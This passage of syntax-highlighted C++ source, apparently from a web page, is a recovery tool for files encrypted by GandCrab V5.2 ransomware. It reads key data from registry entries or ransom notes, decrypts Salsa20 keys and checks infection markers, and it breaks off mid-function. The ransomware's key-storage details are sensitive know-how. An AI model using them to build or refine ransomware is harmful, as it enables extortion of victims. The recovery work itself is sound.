class="line">&#125;;</span><br><span class="line">BYTE LocRSAPriv[<span class="number">0x500</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">enum</span> Base64Option &#123;</span><br><span class="line">Base64Encoding = <span class="number">0</span>,</span><br><span class="line">Base64UrlEncoding = <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">KeepTrailingEquals = <span class="number">0</span>,</span><br><span class="line">OmitTrailingEquals = <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* base64char = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">num_strchr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str, <span class="keyword">char</span> c)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">ReadKey</span><span class="params">(<span class="keyword">char</span>* filePath, <span class="keyword">char</span>* encodedKey)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RepairFile</span><span class="params">(<span class="keyword">char</span>* filePath, <span class="keyword">char</span>* oldFileName)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">DecodeSalsaKey</span><span class="params">(BYTE* KeyData, BYTE* RSAPrivKey)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">JudgeTxtFile</span><span class="params">(<span class="keyword">char</span>* filePath, <span class="keyword">char</span>* Encodedsuffix)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseRepair</span><span class="params">(<span class="keyword">char</span>* filePath, <span class="keyword">char</span>* encodedSuffix)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">base64_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* base64, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dedata)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">GetFileKey</span><span class="params">(<span class="keyword">char</span>* filePath, BYTE* KeyData, <span class="keyword">char</span>* encodedSuffix)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">JudgeEncodedFile</span><span class="params">(<span class="keyword">char</span>* filePath, <span class="keyword">char</span>* encodedSuffix, <span class="keyword">char</span>* oldFileName)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">RegGetKeyValue</span><span class="params">(WCHAR* Reg, WCHAR* RegKeyName, BYTE* Value, DWORD cbData)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">salsa20Decrypt</span><span class="params">(BYTE* EncodedData, DWORD SizeofEncodedData, BYTE* SALSA20KEY, BYTE* SALSA20IV, BYTE* DecodedData)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">GetDecodedData</span><span class="params">(CHAR* FileName, BYTE* salsaKey, BYTE* salsaIV, BYTE fileSize[<span class="number">8</span>], BYTE encodedNumber[<span class="number">8</span>], BYTE* LocRSAPriv)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="keyword">char</span> filePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> path[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WCHAR regSuffix[] = <span class="string">L&quot;SOFTWARE\\ex_data\\data&quot;</span>;<span class="comment">//存放后缀名的注册表</span></span><br><span class="line">WCHAR regSuffixKeyName[] = <span class="string">L&quot;ext&quot;</span>;</span><br><span class="line">WCHAR regKeyData[] = <span class="string">L&quot;SOFTWARE\\keys_data\\data&quot;</span>;<span class="comment">//存放加密本地RSA私钥的Salsa的Key和IV和LocRSAPriv</span></span><br><span class="line">WCHAR regKeyDataName[] = <span class="string">L&quot;private&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> suffix[<span class="number">50</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WCHAR wSuffix[<span class="number">50</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">BYTE keyData[<span class="number">1700</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">BOOL resultFileKey;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;***GandCrab V5.2修复工具***\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;===========================\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要修复的文件目录：&quot;</span>);</span><br><span class="line">gets_s(filePath, MAX_PATH );</span><br><span class="line">lstrcpyA(path,filePath);</span><br><span class="line"></span><br><span class="line">BOOL suffixResult = RegGetKeyValue(regSuffix, regSuffixKeyName, (BYTE*)suffix, <span class="number">50</span>);<span class="comment">//读取注册表，获取到加密后缀名</span></span><br><span class="line"><span class="keyword">int</span> lenOfSuffix = lstrlenW((WCHAR*)suffix);</span><br><span class="line">lstrcpyW(wSuffix, (WCHAR*)suffix);</span><br><span class="line">BOOL keyDataResult = RegGetKeyValue(regKeyData, regKeyDataName, keyData, <span class="number">1688</span>);<span class="comment">//读取注册表，获取加密本地RSA私钥的Salsa的Key和IV和LocRSAPriv</span></span><br><span class="line">WideCharToMultiByte(CP_OEMCP, <span class="number">0</span>, wSuffix, <span class="number">-1</span>, (LPSTR)suffix, lenOfSuffix, <span class="literal">NULL</span>, FALSE);</span><br><span class="line">suffix[lenOfSuffix] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (suffixResult &amp;&amp; keyDataResult)<span class="comment">//当获取注册表失败，便读文件获取密钥数据KeyData</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;读取注册表中的密钥数据失败！\n读取勒索说明中的密钥数据！\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!GetFileKey(filePath, keyData, suffix))<span class="comment">//读取当前目录勒索信息中的密钥信息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取本地密钥数据失败！该目录无法修复（可能未被感染）！\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取本地密钥信息成功！\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;=====开始修复当前目录！=====\n&quot;</span>);</span><br><span class="line">DecodeSalsaKey(keyData + <span class="number">4</span>, AuRSAPubKey);<span class="comment">//解密用来加密本地RSA私钥的SalsaKey</span></span><br><span class="line">DecodeSalsaKey(keyData + <span class="number">0x104</span>, AuRSAPubKey);<span class="comment">//解密用来加密本地RSA私钥的SalsaIV</span></span><br><span class="line">salsa20Decrypt(keyData + <span class="number">0x204</span>, <span class="number">0x494</span>, keyData + <span class="number">4</span>, keyData + <span class="number">0x104</span>, LocRSAPriv);<span class="comment">//根据获取到的SalsaKey和SalsaIV解密本地RSA私钥</span></span><br><span class="line">TraverseRepair(path, suffix);<span class="comment">//遍历当前目录进行修复</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;=====当前目录修复成功！=====\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取勒索说明文件中的密钥和后缀名</span></span><br><span class="line"><span class="comment">//获取成功返回1</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetFileKey</span><span class="params">(<span class="keyword">char</span>* filePath, BYTE* KeyData,<span class="keyword">char</span>* encodedSuffix)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFindFile;</span><br><span class="line">WIN32_FIND_DATAA findFileData;</span><br><span class="line"><span class="keyword">char</span> encodedBuffer[<span class="number">2300</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> path[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> lenOfPath = lstrlenA(filePath);</span><br><span class="line">filePath[lenOfPath] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">lstrcpyA(path, filePath);</span><br><span class="line">lstrcatA(filePath, <span class="string">&quot;*.*&quot;</span>);</span><br><span class="line">hFindFile = FindFirstFileA(filePath, &amp;findFileData);</span><br><span class="line"><span class="keyword">if</span> (hFindFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (lstrcmpA(findFileData.cFileName, <span class="string">&quot;.&quot;</span>) &amp;&amp; lstrcmpA(findFileData.cFileName, <span class="string">&quot;..&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">lstrcpyA(filePath, path);</span><br><span class="line">lstrcatA(filePath, findFileData.cFileName);</span><br><span class="line"><span class="keyword">if</span> (findFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">GetFileKey(filePath, KeyData,encodedSuffix);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!JudgeTxtFile(filePath, encodedSuffix))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (ReadKey(filePath, encodedBuffer))</span><br><span class="line">&#123;</span><br><span class="line"> base64_decode(encodedBuffer,KeyData);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFileA(hFindFile, &amp;findFileData));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断文件后缀是否为.txt，并且获得加密后缀名</span></span><br><span class="line"><span class="comment">//返回1，表明文件为.txt</span></span><br><span class="line"><span class="function">BOOL <span class="title">JudgeTxtFile</span><span class="params">(<span class="keyword">char</span>* filePath,<span class="keyword">char</span>* Encodedsuffix)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPCSTR suffix = PathFindExtensionA(filePath);</span><br><span class="line"><span class="keyword">if</span> (lstrcmpA(suffix, <span class="string">&quot;.txt&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">lstrcpyA(Encodedsuffix,suffix);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> path[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">lstrcpyA(path, filePath);</span><br><span class="line">Encodedsuffix = PathFindFileNameA(path);</span><br><span class="line"><span class="keyword">char</span>* ret = <span class="built_in">strrchr</span>(Encodedsuffix, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">*ret = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断文件是否被加密，并获取原始文件名</span></span><br><span class="line"><span class="comment">//文件被加密，返回1</span></span><br><span class="line"><span class="function">BOOL <span class="title">JudgeEncodedFile</span><span class="params">(<span class="keyword">char</span>* filePath, <span class="keyword">char</span>* encodedSuffix,<span class="keyword">char</span>* oldFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* suffix = PathFindExtensionA(filePath);</span><br><span class="line"><span class="keyword">if</span> (lstrcmpA(suffix, encodedSuffix))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//文件没有被加密</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">lstrcpyA(oldFileName, filePath);</span><br><span class="line"><span class="keyword">char</span>* ret = <span class="built_in">strrchr</span>(oldFileName, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">*ret = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//文件被加密，并获取到原始文件名</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件中的被Base64加密的密钥</span></span><br><span class="line"><span class="comment">//读取成功返回1</span></span><br><span class="line"><span class="function">BOOL <span class="title">ReadKey</span><span class="params">(<span class="keyword">char</span>* filePath,<span class="keyword">char</span> *encodedKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile;</span><br><span class="line">hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">DWORD fileSize = GetFileSize(hFile, <span class="number">0</span>);</span><br><span class="line">WCHAR* bufferw = (WCHAR*)VirtualAlloc(<span class="number">0</span>, fileSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">char</span>* bufferA = (<span class="keyword">char</span> *)VirtualAlloc(<span class="number">0</span>, fileSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ReadFile(hFile, bufferw, fileSize, &amp;NumberOfBytesRead, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">WideCharToMultiByte(CP_OEMCP, <span class="number">0</span>, bufferw, <span class="number">-1</span>, bufferA, fileSize/<span class="number">2</span><span class="number">-1</span>, <span class="literal">NULL</span>, FALSE);<span class="comment">//将UNCODE的后缀转成ASCII</span></span><br><span class="line"><span class="keyword">char</span>* ret = <span class="built_in">strstr</span>(bufferA, <span class="string">&quot;---BEGIN GANDCRAB KEY---&quot;</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(encodedKey, ret + <span class="number">26</span>, <span class="number">2252</span>);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ret = GetLastError();</span><br><span class="line">&#125;</span><br><span class="line">VirtualFree(bufferw, <span class="number">0</span>, <span class="number">0x8000</span>);</span><br><span class="line">VirtualFree(bufferA,<span class="number">0</span>, <span class="number">0x8000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取注册表键值</span></span><br><span class="line"><span class="comment">//返回0，读取成功</span></span><br><span class="line"><span class="function">BOOL <span class="title">RegGetKeyValue</span><span class="params">(WCHAR* Reg, WCHAR* RegKeyName, BYTE* Value, DWORD cbData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HKEY hKey;</span><br><span class="line">BOOL result;</span><br><span class="line">LSTATUS flag = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCWSTR)Reg, <span class="number">0</span>, KEY_READ | KEY_QUERY_VALUE, &amp;hKey);</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">flag = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCWSTR)Reg, <span class="number">0</span>, KEY_READ | KEY_QUERY_VALUE, &amp;hKey);</span><br><span class="line"><span class="keyword">if</span> (!flag)</span><br><span class="line">&#123;</span><br><span class="line">result = RegQueryValueEx(hKey, (LPCWSTR)RegKeyName, <span class="number">0</span>, <span class="number">0</span>, Value, &amp;cbData);</span><br><span class="line">RegCloseKey(hKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">result = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用RSA私钥解密SalsaKey和SalsaIV</span></span><br><span class="line"><span class="comment">//参数1 要解密的Salsakey或SalsaIV</span></span><br><span class="line"><span class="comment">//参数2 RSAPrivKey</span></span><br><span class="line"><span class="function">BOOL <span class="title">DecodeSalsaKey</span><span class="params">(BYTE* KeyData, BYTE* RSAPrivKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HCRYPTPROV phProv;</span><br><span class="line">HCRYPTPROV phKey;</span><br><span class="line">DWORD DataLen = <span class="number">256</span>;</span><br><span class="line">BOOL result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CryptAcquireContextW(&amp;phProv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))</span><br><span class="line">&#123;</span><br><span class="line">result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (CryptImportKey(phProv, RSAPrivKey, <span class="number">0x494</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;phKey))</span><br><span class="line">&#123;</span><br><span class="line">result = CryptDecrypt(phKey, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, KeyData, &amp;DataLen);</span><br><span class="line">&#125;</span><br><span class="line">CryptDestroyKey(phKey);</span><br><span class="line">CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据Key和IV生成Salsa20，解密数据</span></span><br><span class="line"><span class="comment">//参数1 被加密的数据</span></span><br><span class="line"><span class="comment">//参数2 加密的数据大小</span></span><br><span class="line"><span class="comment">//参数3，4 KEY和IV</span></span><br><span class="line"><span class="comment">//参数5 解密后的数据</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">salsa20Decrypt</span><span class="params">(BYTE* EncodedData, DWORD SizeofEncodedData, BYTE* SALSA20KEY, BYTE* SALSA20IV, BYTE* DecodedData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Salsa20::Decryption dec;<span class="comment">//定义解密对象</span></span><br><span class="line"></span><br><span class="line"><span class="function">SecByteBlock <span class="title">KEY</span><span class="params">(SALSA20KEY, <span class="number">0x20</span>)</span></span>;</span><br><span class="line"><span class="function">SecByteBlock <span class="title">IV</span><span class="params">(SALSA20IV, <span class="number">0x8</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">dec.SetKeyWithIV(KEY, KEY.size(), IV);<span class="comment">//生成SalsaKey</span></span><br><span class="line">dec.ProcessData(DecodedData, EncodedData, SizeofEncodedData);<span class="comment">//解密数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件密钥数据,获取加密文件的SalsaKey和SalsaIV</span></span><br><span class="line"><span class="comment">//获取成功返回1</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetDecodedData</span><span class="params">(CHAR* FileName,BYTE* salsaKey,BYTE* salsaIV,BYTE fileSize[<span class="number">8</span>],BYTE encodedNumber[<span class="number">8</span>],BYTE* LocRSAPriv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile;</span><br><span class="line">BYTE fileEndBuffer[<span class="number">0x21C</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line">hFile = CreateFileA(FileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">SetFilePointer(hFile,(<span class="keyword">long</span>)<span class="number">-540</span>,<span class="number">0</span>,FILE_END);</span><br><span class="line">ReadFile(hFile, fileEndBuffer, <span class="number">0x21C</span>, &amp;NumberOfBytesRead, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (*(DWORD*)(fileEndBuffer+<span class="number">0x214</span>) == <span class="number">0x93892918</span> &amp;&amp; *(DWORD*)(fileEndBuffer+<span class="number">0x218</span>) == <span class="number">0x38281</span>)<span class="comment">//判断感染标志</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!DecodeSalsaKey(fileEndBuffer, LocRSAPriv) || !DecodeSalsaKey(fileEndBuffer + <span class="number">0x100</span>, LocRSAPriv))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(salsaKey, fileEndBuffer,<span class="number">32</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(salsaIV, fileEndBuffer + <span class="number">0x100</span>, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(encodedNumber, (fileEndBuffer + <span class="number">0x208</span>),<span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(fileSize,(fileEndBuffer + <span class="number">0x200</span>),<span class="number">8</span>);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Base64解密</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">base64_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* base64, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dedata)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> trans[<span class="number">4</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (; base64[i] != <span class="string">&#x27;\0&#x27;</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="comment">// 每四个一组，译码成三个字符</span></span><br><span class="line">trans[<span class="number">0</span>] = num_strchr(base64char, base64[i]);</span><br><span class="line">trans[<span class="number">1</span>] = num_strchr(base64char, base64[i + <span class="number">1</span>]);</span><br><span class="line"><span class="comment">// 1/3</span></span><br><span class="line">dedata[j++] = ((trans[<span class="number">0</span>] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xfc</span>) | ((trans[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x03</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (base64[i + <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">trans[<span class="number">2</span>] = num_strchr(base64char, base64[i + <span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2/3</span></span><br><span class="line">dedata[j++] = ((trans[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xf0</span>) | ((trans[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x0f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (base64[i + <span class="number">3</span>] == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">trans[<span class="number">3</span>] = num_strchr(base64char, base64[i + <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3/3</span></span><br><span class="line">dedata[j++] = ((trans[<span class="number">2</span>] &lt;&lt; <span class="number">6</span>) &amp; <span class="number">0xc0</span>) | (trans[<span class="number">3</span>] &amp; <span class="number">0x3f</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dedata[j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Base64带的方法</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">num_strchr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str, <span class="keyword">char</span> c)</span> <span class="comment">//</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* pindex = <span class="built_in">strchr</span>(str, c);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pindex) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pindex - str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历当前目录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseRepair</span><span class="params">(<span class="keyword">char</span>* filePath,<span class="keyword">char</span>* encodedSuffix)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFindFile;</span><br><span class="line">WIN32_FIND_DATAA findFileData;</span><br><span class="line"><span class="keyword">char</span> path[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> oldFileName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> lenOfPath = lstrlenA(filePath);</span><br><span class="line">filePath[lenOfPath] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">lstrcpyA(path, filePath);</span><br><span class="line">lstrcatA(filePath, <span class="string">&quot;*.*&quot;</span>);</span><br><span class="line">hFindFile = FindFirstFileA(filePath, &amp;findFileData);</span><br><span class="line"><span class="keyword">if</span> (hFindFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (lstrcmpA(findFileData.cFileName, <span class="string">&quot;.&quot;</span>) &amp;&amp; lstrcmpA(findFileData.cFileName, <span class="string">&quot;..&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">lstrcpyA(filePath, path);</span><br><span class="line">lstrcatA(filePath, findFileData.cFileName);</span><br><span class="line"><span class="keyword">if</span> (findFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">TraverseRepair(filePath, encodedSuffix);<span class="comment">//递归</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (JudgeEncodedFile(filePath, encodedSuffix, oldFileName))<span class="comment">//判断文件是否被加密</span></span><br><span class="line">RepairFile(filePath, oldFileName);<span class="comment">//修复文件</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFileA(hFindFile, &amp;findFileData));</span><br><span class="line">FindClose(hFindFile);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修复文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RepairFile</span><span class="params">(<span class="keyword">char</span>* filePath, <span class="keyword">char</span>* oldFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile;</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line">BYTE SalsaKey[<span class="number">40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">BYTE SalsaIV[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">BYTE fileSize[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">BYTE encodedNumber[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (GetDecodedData(filePath, SalsaKey, SalsaIV, fileSize, encodedNumber, LocRSAPriv))<span class="comment">//验证感染特征，进一步判断是否被感染</span></span><br><span class="line">&#123;</span><br><span class="line">hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">LPVOID EncodedBuffer = VirtualAlloc(<span class="number">0</span>, <span class="number">0x100000</span>, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//开辟虚拟空间存储加密后的数据</span></span><br><span class="line">LPVOID DecodedBuffer = VirtualAlloc(<span class="number">0</span>, <span class="number">0x100000</span>, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//开辟虚拟空间存储解密后的文件</span></span><br><span class="line"><span class="keyword">for</span> (LONG64 i = <span class="number">0</span>; i &lt; 